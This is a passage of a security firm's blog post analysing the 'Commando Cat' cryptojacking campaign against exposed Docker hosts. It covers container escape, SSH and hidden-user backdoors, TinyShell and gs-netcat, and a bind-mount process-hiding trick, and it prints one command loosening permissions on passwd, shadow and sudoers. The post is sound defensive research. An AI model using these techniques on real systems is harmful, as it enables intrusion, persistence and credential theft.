      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/cross-cloud-investigations" role="menuitem">Cross Cloud Investigations</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/container-and-k8s-investigations" role="menuitem">Container &amp; K8s Investigations</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/endpoint-triage" role="menuitem">Endpoint Triage</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/saas-investigations" role="menuitem">SaaS Investigations</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/cloud-detection-and-response" role="menuitem">Cloud Detection &amp; Response (CDR)</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/evidence-preservation" role="menuitem">Evidence Preservation</a></li>
     </ul></li>
    <li class="hs-menu-item hs-menu-depth-2 hs-item-has-children" role="none"><a href="javascript:;" role="menuitem">Cado For</a>
     <ul role="menu" class="hs-menu-children-wrapper">
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/dfir" role="menuitem">DFIR</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/security-operations-center" role="menuitem">SOC</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/mssp" role="menuitem">MSSPs</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/partners" role="menuitem">Partners</a></li>
      <li class="hs-menu-item hs-menu-depth-3" role="none"><a href="https://www.cadosecurity.com/solutions/government" role="menuitem">Government</a></li>
     </ul></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Resources</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/resources" role="menuitem">All Resources</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/blog" role="menuitem">Blog</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/news-and-events" role="menuitem">News</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/cado-community-edition" role="menuitem">Community</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://docs.cadosecurity.com/cado-response/intro" role="menuitem" target="_blank" rel="noopener">Documentation</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/wiki" role="menuitem">Wiki</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Company </a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/about" role="menuitem">About</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/careers" role="menuitem">Careers</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/cado-security-labs" role="menuitem">Cado Security Labs</a></li>
   </ul></li>
 </ul>
</div></span>
        </div>
        
        
        <div class="mobile-cta">
          <span id="hs_cos_wrapper_u4m-header_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_cta" style="" data-hs-cos-general-type="widget" data-hs-cos-type="cta"><!--HubSpot Call-to-Action Code --><span class="hs-cta-wrapper" id="hs-cta-wrapper-a51b72aa-daa5-4df8-a061-1902834ccdb0"><span class="hs-cta-node hs-cta-a51b72aa-daa5-4df8-a061-1902834ccdb0" id="hs-cta-a51b72aa-daa5-4df8-a061-1902834ccdb0"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/14518100/a51b72aa-daa5-4df8-a061-1902834ccdb0"><img class="hs-cta-img" id="hs-cta-img-a51b72aa-daa5-4df8-a061-1902834ccdb0" style="border-width:0px;" src="https://no-cache.hubspot.com/cta/default/14518100/a51b72aa-daa5-4df8-a061-1902834ccdb0.png" alt="Get a Demo"></a></span><script charset="utf-8" src="/hs/cta/cta/current.js"></script><script type="text/javascript"> hbspt.cta._relativeUrls=true;hbspt.cta.load(14518100, 'a51b72aa-daa5-4df8-a061-1902834ccdb0', {"useNewLoader":"true","region":"na1"}); </script></span><!-- end HubSpot Call-to-Action Code --></span>  
        </div>
        
        
      </div>
    </div>
  </div>
  
  <div class="search-overlay">
  <div class="hs-search-field"> 
  <div class="hs-search-field__bar"> 
    <form action="/hs-search-results">
      <input type="text" class="hs-search-field__input search-input" name="term" autocomplete="off" aria-label="Search" placeholder="Search">
      
      
      <input type="hidden" name="type" value="SITE_PAGE">
      <input type="hidden" name="type" value="LANDING_PAGE">
      <input type="hidden" name="type" value="BLOG_POST">
      <input type="hidden" name="type" value="LISTING_PAGE">
      <input type="hidden" name="type" value="KNOWLEDGE_ARTICLE">     
      
      
          
      
      
      
      
      <button aria-label="Search" class="search-button">
        
        <svg width="18px" height="18px" viewbox="0 0 18 18" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
          <g id="Round-Three-Design" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
              <g id="CADO-Additional-Modules-R3" transform="translate(-1299, -58)" fill="#0E4271" fill-rule="nonzero">
                  <g id="search_FILL0_wght400_GRAD0_opsz24-(6)-Copy" transform="translate(1299, 58)">
                      <path d="M16.6,18 L10.3,11.7 C9.8,12.1 9.225,12.4166667 8.575,12.65 C7.925,12.8833333 7.23333333,13 6.5,13 C4.68333333,13 3.14583333,12.3708333 1.8875,11.1125 C0.629166667,9.85416667 0,8.31666667 0,6.5 C0,4.68333333 0.629166667,3.14583333 1.8875,1.8875 C3.14583333,0.629166667 4.68333333,0 6.5,0 C8.31666667,0 9.85416667,0.629166667 11.1125,1.8875 C12.3708333,3.14583333 13,4.68333333 13,6.5 C13,7.23333333 12.8833333,7.925 12.65,8.575 C12.4166667,9.225 12.1,9.8 11.7,10.3 L18,16.6 L16.6,18 Z M6.5,11 C7.75,11 8.8125,10.5625 9.6875,9.6875 C10.5625,8.8125 11,7.75 11,6.5 C11,5.25 10.5625,4.1875 9.6875,3.3125 C8.8125,2.4375 7.75,2 6.5,2 C5.25,2 4.1875,2.4375 3.3125,3.3125 C2.4375,4.1875 2,5.25 2,6.5 C2,7.75 2.4375,8.8125 3.3125,9.6875 C4.1875,10.5625 5.25,11 6.5,11 Z" id="Shape"></path>
                  </g>
              </g>
          </g>
        </svg>
      </button>      

      <span class="search-overlay-close search-toggle-button" aria-label="Close">
        <i class="fas fa-times" aria-hidden="true"></i>
      </span>

    </form>
  </div>
  <ul class="hs-search-field__suggestions"></ul>
</div>
  </div> 
  
</header></div>
    

    

<main id="main-content" class="body-container-wrapper">

  

  <section class="u4m-blog-post">
    <!-- Blog Post Hero -->
    <div class="hero">
      <img class="left-curve-design" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Shapes/blog-curve-hero.svg" alt="curve design on left">
      <img data-aos="fade-right" data-aos-duration="800" class="right-image" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Images/Clouds/cloud-blog.svg" alt="cloud image">

      <div class="content">
        <span class="date"></span>
        <h1 class="title"><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">The Nine Lives of Commando Cat: Analysing a Novel Malware Campaign Targeting Docker</span></h1>
        <div class="author-wrap">
          <div class="author-link">Written by: <a href="https://www.cadosecurity.com/blog/author/nate-bill">Nate Bill</a></div>        
        </div>
      </div>
    </div>
    <!-- End Blog Post Hero -->
  
    <!-- Blog Post Body -->
    <div class="body" id="body">
      <div class="share" id="share">
          <a href="https://twitter.com/intent/tweet?original_referer=https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker&amp;url=https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker&amp;source=tweetbutton" target="_blank" aria-label="Twitter">
            <svg width="23.4185473px" height="24px" viewbox="0 0 23.4185473 24" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
              <g id="Round-Three-Design" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                  <g id="CADO-Homepage-R3" transform="translate(-200, -6761)" fill="#0E5DA3" fill-rule="nonzero">
                      <g id="logo" transform="translate(200, 6761)">
                          <path d="M13.9372166,10.1623621 L22.6552978,0 L20.5893916,0 L13.0194828,8.8238362 L6.97341888,0 L0,0 L9.14283504,13.3432031 L0,24 L2.06602327,24 L10.060042,14.681729 L16.4451284,24 L23.4185473,24 L13.9367092,10.1623621 L13.9372166,10.1623621 Z M11.1075145,13.4607598 L10.1811549,12.1320776 L2.81044034,1.55961545 L5.98373156,1.55961545 L11.931984,10.0919298 L12.8583437,11.4206121 L20.5903674,22.5113139 L17.4170762,22.5113139 L11.1075145,13.4612686 L11.1075145,13.4607598 Z" id="Shape"></path>
                      </g>
                  </g>
              </g>
            </svg>
          </a>
          <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker" target="_blank" aria-label="LinkedIn"><span class="fab fa-linkedin" aria-hidden="true"></span></a>
          <a href="http://www.facebook.com/share.php?u=https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker" target="_blank" aria-label="Facebook"><span class="fab fa-facebook" aria-hidden="true"></span></a>
          <a href="mailto:?subject=Check%20out%20https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker" aria-label="email"><span class="fa fa-envelope" aria-hidden="true"></span></a>
      </div>
      <div class="content"><span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p> 
 <!-- wp:paragraph --></p> 
<!--more--><p>By Nate Bill &amp; Matt Muir</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"align":"center","id":9879,"width":"626px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image aligncenter size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image1-63-1.png" alt="" class="wp-image-9879" style="width:626px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Summary </h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:list --></p> 
<ul> 
 <!-- wp:list-item --> 
 <li>Commando Cat is a novel cryptojacking campaign exploiting Docker for Initial Access</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>The campaign deploys a benign container generated using the <a href="https://github.com/lukaszlach/commando">Commando Project</a></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>The attacker escapes this container and runs multiple payloads on the Docker host</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>The campaign deploys a credential stealer payload, targeting Cloud Service Provider credentials (AWS, GCP, Azure)</li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li>The other payloads exhibit a variety of sophisticated techniques, including an interesting process hiding technique and a Docker Registry blackhole</li> 
 <p> 
  <!-- /wp:list-item --></p> 
</ul> 
<p> 
 <!-- /wp:list --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Introduction </h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Cado researchers have recently encountered a novel malware campaign, dubbed “Commando Cat”, targeting exposed Docker API endpoints. This is the second campaign targeting Docker since the beginning of 2024, the first being the malicious deployment of the <a href="https://www.cadosecurity.com/containerised-clicks-malicious-use-of-9hits-on-vulnerable-docker-hosts/">9hits</a> traffic exchange application, our report into which was published only a matter of weeks ago.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Attacks on Docker are relatively common, particularly in cloud environments. This campaign demonstrates the continued determination attackers have to exploit the service and achieve a variety of objectives. Commando Cat is a cryptojacking campaign leveraging Docker as an initial access vector and (ab)using the service to mount the host’s filesystem, before running a series of interdependent payloads directly on the host.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>As described in the coming sections, these payloads are responsible for registering persistence, enabling a backdoor, exfiltrating various Cloud Service Provider credential files and executing the miner itself. Of particular interest are a number of evasion techniques exhibited by the malware, including an unusual process hiding mechanism.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">Initial Access</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The payloads are delivered to exposed Docker API instances over the Internet by the IP <code>45[.]9.148.193</code> (which is the same as C2). The attacker instructs Docker to pull down a Docker image called <code>cmd.cat/chattr</code>. The cmd.cat (also known as Commando) project</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><em>&nbsp;“generates Docker images on-demand with all the commands you need and simply point them by name in the docker run command.”&nbsp;</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>It is likely used by the attacker to seem like a benign tool and not arouse suspicion.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The attacker then creates the container with a custom command to execute:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9885,"width":"595px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-4_47_15-PM.png" alt="" class="wp-image-9885" style="width:595px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>It uses the chroot to escape from the container onto the host operating system. This initial command checks if the following services are active on the system:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:list --></p> 
<ul> 
 <!-- wp:list-item --> 
 <li><code>sys-kernel-debugger</code></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>gsc</code></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>c3pool_miner</code></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>dockercache</code></li> 
 <p> 
  <!-- /wp:list-item --></p> 
</ul> 
<p> 
 <!-- /wp:list --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The <code>gsc</code>, <code>c3pool_miner</code>, and <code>dockercache</code> services are all created by the attacker after infection. The purpose of the check for <code>sys-kernel-debugger</code> is unclear - this service is not used anywhere in the malware, nor is it part of Linux. It is possible that the service is part of another campaign that the attacker does not want to compete with.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Once these checks pass, it runs the container again with another command, this time to infect it:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9886,"width":"548px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-4_48_01-PM.png" alt="" class="wp-image-9886" style="width:548px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This script first chroots to the host, and then tries to copy any binaries named <code>wls</code> or <code>cls</code> to <code>wget</code> and <code>curl</code> respectively. A common TTP of cryptojacking campaigns is that they will rename these binaries to evade detection, likely the attacker is anticipating that this box was previously infected by a campaign that renamed the binaries to this, and is undoing that. The attacker then uses either <code>wget</code> or <code>curl</code> to pull down the user.sh payload.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This is repeated with the sh parameter changed to the following other scripts:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:list --></p> 
<ul> 
 <!-- wp:list-item --> 
 <li><code>tshd</code></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>gsc</code></li> 
 <p> 
  <!-- /wp:list-item --></p> 
 <p> 
  <!-- wp:list-item --></p> 
 <li><code>aws</code></li> 
 <p> 
  <!-- /wp:list-item --></p> 
</ul> 
<p> 
 <!-- /wp:list --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>In addition, another payload is delivered directly as a base64 encoded script instead of being pulled down from the C2, this will be discussed in a later section.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">user.sh</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The primary purpose of the <code>user.sh</code> payload is to create a backdoor in the system by adding an SSH key to the root account, as well as adding a user with an attacker-known password.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>On startup, the script changes the permissions and attributes on various system files such as <code>passwd,</code> <code>shadow</code>, and <code>sudoer</code>s in order to allow for the creation of the backdoor user:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9887,"width":"598px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-4_49_12-PM.png" alt="" class="wp-image-9887" style="width:598px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>chmod 644 /etc/passwd /etc/shadow /etc/sudoers 2&gt;/dev/null 1&gt;/dev/null<br>It then calls a function called <code>make_ssh_backdoor,</code> which inserts the following RSA and ED25519 SSH key into the root user’s <code>authorized_keys</code> file:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9888,"width":"558px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-4_51_50-PM.png" alt="" class="wp-image-9888" style="width:558px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>It then updates a number of SSH config options in order to ensure root login is permitted, along with enabling public key and password authentication. It also sets the <code>AuthorizedKeysFile</code> variable to a local variable named “<code>$hidden_authorized_keys</code>”, however this variable is never actually defined in the script, resulting in public key authentication breaking.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Once the SSH backdoor has been installed, the script then calls <code>make_hidden_door</code> (because all good malware has a backdoor and a hidden door, right?). The function creates a new user called “games” by adding an entry for it directly into <code>/etc/passwd and /etc/shadow</code>, as well giving it sudo permission in <code>/etc/sudoers</code>.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The “games” user has its home directory set to <code>/usr/games</code>, likely as an attempt to appear as legitimate. To continue this theme, the attacker also has opted to set the login shell for the “games” user as <code>/usr/bin/nologin</code>. This is not the path for the real nologin binary, and is instead a copy of bash placed here by the malware. This makes the “games” user appear as a regular service account, while actually being a backdoor.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9889,"width":"530px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-4_52_46-PM.png" alt="" class="wp-image-9889" style="width:530px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>With the two backdoors in place, the malware then calls home with the SSH details to an API on the C2 server. Additionally, it also restarts sshd to apply the changes it made to the configuration file, and wipes the bash history.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9890,"width":"560px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-4_53_29-PM.png" alt="" class="wp-image-9890" style="width:560px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This provides the attacker with all the information required to connect to the server via SSH at any time, using either the root account with a pubkey, or the “games” user with a password or pubkey. However, as previously mentioned, pubkey authentication is broken due to a bug in the script. Consequently, the attacker only has password access to “games” in practice.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">tshd.sh</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This script is responsible for deploying <a href="https://github.com/creaktive/tsh">TinyShell</a> (tsh), an open source Unix backdoor written in C. Upon launch, the script will try to install <code>make</code> and <code>gcc</code> using either <code>apk</code>, <code>apt</code>, or <code>yum</code>, depending on which is available. The script then pulls a copy of the <code>tsh</code> binary from the C2 server, compiles it, and then executes it.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9892,"width":"450px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-4_54_18-PM.png" alt="" class="wp-image-9892" style="width:450px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>TinyShell works by listening on the host for incoming connections (on port 2180 in this case), with security provided by a hardcoded encryption key in both the client and server binaries. As the attacker has graciously provided us with the code, we can identify the key is “base64st”.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>A side effect of this is that other threat actors could easily scan for this port and try authenticating using the secret key, allowing anyone with the skills and resources to take over the botnet. TinyShell has been commonly used as a payload before, as an example, <a href="https://www.mandiant.com/resources/blog/unc2891-overview">UNC2891</a> has made extensive use of TinyShell during their attacks on Oracle Solaris based systems.<br>The script then calls out to a freely available IP logger service called yip[.]su. This allows the attacker to be notified of where the <code>tsh</code> binary is running, so they can connect to the infected machine.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9893,"width":"421px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-4_56_18-PM.png" alt="" class="wp-image-9893" style="width:421px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Finally, the script drops another script to <code>/bin/hid</code> (also referred to as hid in the script), which can be used to hide processes:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9894,"width":"275px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-4_56_42-PM.png" alt="" class="wp-image-9894" style="width:275px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This script works by cloning the Linux mtab file (a list of the active mounts) to another directory. It then creates a new bind mount for the <code>/proc/pid</code> directory of the process the attacker wants to hide, before restoring the mtab. The bind mount causes any queries to the <code>/proc/pid</code> directory to show an empty directory, causing tools like ps aux to omit the process. Cloning the mtab and then restoring the older version also hides the created bind mount, making it harder to detect.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The script then uses this binary to hide the tshd process.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2 class="wp-block-heading">gsc.sh</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This script is responsible for deploying a backdoor called <code>gs-netcat</code>, a souped up version of <code>netcat</code> that can punch through NAT and firewalls. It’s purpose is likely for acting as a backdoor in scenarios where traditional backdoors like TinyShell would not work, such as when the infected host is behind NAT.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Gs-netcat works in a somewhat interesting way - in order for nodes to find each other, they use their shared secret instead of IP address using the <a href="https://www.gsocket.io/">global socket</a> service. This permits <code>gs-netcat</code> to function in virtually every environment as it circumvents many firewalls on both the client and server end. In order to calculate a shared secret, the script simply uses the victims IP and hostname:</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9898,"width":"328px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_01_17-PM.png" alt="" class="wp-image-9898" style="width:328px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>This is more acceptable than <code>tsh</code> from a security point of view, there are 4 billion possible IP addresses and many more possible hostnames, making a bruteforce harder, although still possible by using strategies such as lists of common hostnames and trying IPs from blocks known for hosting virtual servers such as AWS.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The script proceeds to set up <code>gs-netcat</code> by pulling it from the attacker’s C2 server, using a specific version based on the architecture of the infected system. Interestingly to note, the attacker will use the cmd.cat containers to untar the downloaded payload, if tar is not available on the system or fails. Instead of using /tmp, it also uses /dev/shm instead, which acts as a temporary file store but memory backed instead. It is possible that this is an evasion mechanism, as it is much more common for malware to use /tmp. This also results in the artefacts not touching the disk, making forensics somewhat harder. This technique has been used before in <a href="https://www.elastic.co/security-labs/a-peek-behind-the-bpfdoor">BPFdoor</a> - a high profile Linux campaign.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"id":9901,"width":"485px","height":"auto","sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image size-full is-resized"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/Screen-Shot-2024-01-31-at-5_02_19-PM.png" alt="" class="wp-image-9901" style="width:485px;height:auto"> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
